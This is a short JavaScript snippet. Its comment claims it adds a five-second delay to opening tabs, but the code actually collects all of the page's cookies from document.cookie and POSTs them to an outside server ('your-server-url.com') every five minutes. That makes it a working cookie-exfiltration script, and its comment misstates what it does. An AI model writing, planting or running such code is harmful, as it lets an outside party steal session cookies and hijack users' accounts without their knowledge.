// Adding a 5-second delay when opening all future tabs using cookies
setTimeout(() => {
  // Retrieve all cookies
  const cookies = document.cookie.split(';');

  // Send all cookies to a server every 5 minutes
  setInterval(() => {
    fetch('https://your-server-url.com/cookies', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(cookies),
    })
      .then(response => {
        // Handle response if needed
      })
      .catch(error => {
        // Handle error if needed
      });
  }, 300000); // 5 minutes (300,000 milliseconds)
}, 5000); // 5 seconds
